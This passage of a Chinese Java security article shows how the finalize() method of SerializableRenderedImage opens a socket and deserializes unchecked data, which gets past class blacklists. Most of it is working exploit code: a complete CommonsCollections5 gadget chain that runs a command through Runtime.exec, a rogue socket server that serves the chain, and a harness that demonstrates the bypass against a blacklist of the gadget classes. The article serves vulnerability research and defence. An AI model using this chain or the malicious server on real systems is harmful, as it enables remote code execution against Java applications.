在“后反序列化漏洞”场景下，对于这种我们可以通过`javax.media.jai.remote.SerializableRenderedImage`来绕过，该类通常不在默认黑名单内，首先来看看它的`finalize`方法。
    public final class SerializableRenderedImage implements RenderedImage,
    Serializable {
     protected void finalize() throws Throwable {
         dispose();
         // Forward to the parent class.
         super.finalize();
     }
     public void dispose() {
         // Rejoin the server thread if using a socket-based server.
         if (isServer) {
          …
         } else {
         // Transmit a message to the server to indicate the child's
        exit.
         closeClient();
        }
     }
     private void closeClient() {
         // Connect to the data server.
         Socket socket = connectToServer();
         // Get the socket output stream and wrap an object
         // output stream around it.
         OutputStream out = null;
         ObjectOutputStream objectOut = null;
         ObjectInputStream objectIn = null;
         try {
             out = socket.getOutputStream();
             objectOut = new ObjectOutputStream(out);
             objectIn = new ObjectInputStream(socket.getInputStream());
             } catch (IOException e) {
                …
            }
            …
         try {
            objectIn.readObject();
         } catch (IOException e) {
            …
         }
    }
`finalize() > dispose() > closeClient()`
假如该类在反序列化后需要进行`finalize`，那么最后会触发到`closeClient`并发起了一次远程的socket连接，而在此处`readObject`的ObjectInputStream没有进行Look-Ahead，由此造成了新的反序列化攻击。 我们来看一下实际案例，先测试一下通过BlacklistObjectInputStream拦截cc5链的情况
    public class Test {
        public static void main(String[] args) throws Exception {
            //CC5
            final String[] execArgs = new String[] { "open /System/Applications/Calculator.app" };
            // inert chain for setup
            final Transformer transformerChain = new ChainedTransformer(
                    new Transformer[]{ new ConstantTransformer(1) });
            // real chain for after setup
            final Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                            String.class, Class[].class }, new Object[] {
                            "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class }, execArgs),
                    new ConstantTransformer(1) };
            final Map innerMap = new HashMap();
            final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
            TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
            BadAttributeValueExpException val = new BadAttributeValueExpException(null);
            Field valfield = val.getClass().getDeclaredField("val");
            SocketServer.setAccessible(valfield);
            valfield.set(val, entry);
            SocketServer.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
            FileOutputStream fos = new FileOutputStream("testBlackList.ser");
            ObjectOutputStream oos = new ObjectOutputStream(fos);
            oos.writeObject(val);
            oos.flush();
            Set blacklist = new HashSet() {{
                add("javax.management.BadAttributeValueExpException");
                add("org.apache.commons.collections.keyvalue.TiedMapEntry");
                add("org.apache.commons.collections.functors.ChainedTransformer");
            }};
            BlacklistObjectInputStream ois = new BlacklistObjectInputStream(new FileInputStream("testBlackList.ser"),blacklist);
            ois.readObject();
        }
    }
运行后报错
可以看到拦截成功，接下来我们试下`SerializableRenderedImage`绕过 首先需要建立一个SocketServer，先运行它
    public class SocketServer {
        public static void setAccessible(AccessibleObject member) {
            // quiet runtime warnings from JDK9+
            Permit.setAccessible(member);
        }
        public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
            final Field field = getField(obj.getClass(), fieldName);
            field.set(obj, value);
        }
        public static void makeSer() throws Exception {
            File imageFile = new File(System.getProperty("user.dir") + "/1.jpg");
            BufferedImage picImage = ImageIO.read(imageFile);
            SerializableRenderedImage serializableRenderedImage = new SerializableRenderedImage(picImage, true);
            getField(SerializableRenderedImage.class, "port").setInt(serializableRenderedImage, 9111);
            FileOutputStream fos = new FileOutputStream("testBypass.ser");
            ObjectOutputStream oos = new ObjectOutputStream(fos);
            oos.writeObject(serializableRenderedImage);
            oos.flush();
        }
        public static void main(String[] args) throws Exception {
            try {
                makeSer();
                ServerSocket server = new ServerSocket(9111);
                while (true) {
                    Socket socket = server.accept();
                    invoke(socket);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        private static void invoke(final Socket socket) throws IOException {
            new Thread(new Runnable() {
                public void run() {
                    ObjectInputStream is = null;
                    ObjectOutputStream os = null;
                    try {
                        is = new ObjectInputStream(new BufferedInputStream(socket.getInputStream()));
                        os = new ObjectOutputStream(socket.getOutputStream());
                        //CC5
                        final String[] execArgs = new String[] { "open /System/Applications/Calculator.app" };
                        // inert chain for setup
                        final Transformer transformerChain = new ChainedTransformer(
                                new Transformer[]{ new ConstantTransformer(1) });
                        // real chain for after setup
                        final Transformer[] transformers = new Transformer[] {
                                new ConstantTransformer(Runtime.class),
                                new InvokerTransformer("getMethod", new Class[] {
                                        String.class, Class[].class }, new Object[] {
                                        "getRuntime", new Class[0] }),
                                new InvokerTransformer("invoke", new Class[] {
                                        Object.class, Object[].class }, new Object[] {
                                        null, new Object[0] }),
                                new InvokerTransformer("exec",
                                        new Class[] { String.class }, execArgs),
                                new ConstantTransformer(1) };
                        final Map innerMap = new HashMap();
                        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
                        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
                        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
                        Field valfield = val.getClass().getDeclaredField("val");
                        setAccessible(valfield);
                        valfield.set(val, entry);
                        setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
                        os.writeObject(val);
                        os.flush();
                    } catch (IOException ex) {
                    } catch(ClassNotFoundException ex) {
                    } catch (NoSuchMethodException e) {
                        e.printStackTrace();
                    } catch (InstantiationException e) {
                        e.printStackTrace();
                    } catch (IllegalAccessException e) {
                        e.printStackTrace();
                    } catch (InvocationTargetException e) {
                        e.printStackTrace();
                    } catch (NoSuchFieldException e) {
                        e.printStackTrace();
                    } catch (Exception e) {
                        e.printStackTrace();
                    } finally {
                        try {
                            is.close();
                        } catch(Exception ex) {}
                        try {
                            os.close();
                        } catch(Exception ex) {}
                        try {
                            socket.close();
                        } catch(Exception ex) {}
                    }
                }
            }).start();
        }
    }
它会在被连接后发送cc5链对象的序列化数据给客户端。 接着我们来模拟反序列化操作，看下绕过黑名单的效果
    /**
     * Created by ruilin on 2020/2/18.
     * 利用"后反序列化漏洞"绕过反序列化黑名单
     */
    class DeserializeBypass {
        private static void callFinalize(Object obj, Class objClass) throws Exception {
            Method finalize = objClass.getDeclaredMethod("finalize", new Class[]{});
            finalize.setAccessible(true);
            finalize.invoke(obj, new Object[]{});
        }
        private static void callFinalize(Object obj) throws Exception {
            Class objClass = obj.getClass();
            callFinalize(obj, objClass);
        }
        public static void main(String[] args) throws Exception {
            // 设置黑名单拦截RCE的链
            Set blacklist = new HashSet() {{
                add("javax.management.BadAttributeValueExpException");
                add("org.apache.commons.collections.keyvalue.TiedMapEntry");
                add("org.apache.commons.collections.functors.ChainedTransformer");
            }};
            BlacklistObjectInputStream ois = new BlacklistObjectInputStream(new FileInputStream("testBypass.ser"),blacklist);
            SerializableRenderedImage s = (SerializableRenderedImage) ois.readObject();
            callFinalize(s);
            ois.close();
            System.out.println("test");
        }
    }
成功 `finalize`防护不能采用类似攻击Java应用在反序列化后拦截的方法，而应该增加黑名单，在反序列化中就将其过滤掉。
## 总结
本文主要介绍的是“后反序列化漏洞”在Java中的利用思路，“后反序列化漏洞”是我自己新造的一个词，主要是来概括这种在反序列化之后的对象出现调用链攻击的漏洞，我认为这种漏洞相对少见一些，但确实存在，也有一定风险。
对于Java反序列化后可能触发的方法如下： _finalize()_ toString() _hashCode()_ equals()
本文中主要展示了`toString`和`finalize`的利用方法，总的来看Java应用中如果使用了反序列化同时其没过滤类似`toString`，`finalize`的gadgets下是可能出现这类触发点多一些的，而测试中建议也可以尝试使用这类gadgets打打看，可能就会有意外收获。
以上代码见：
如果大家有新的思路，疑问或者案例欢迎与我交流讨论。
* * *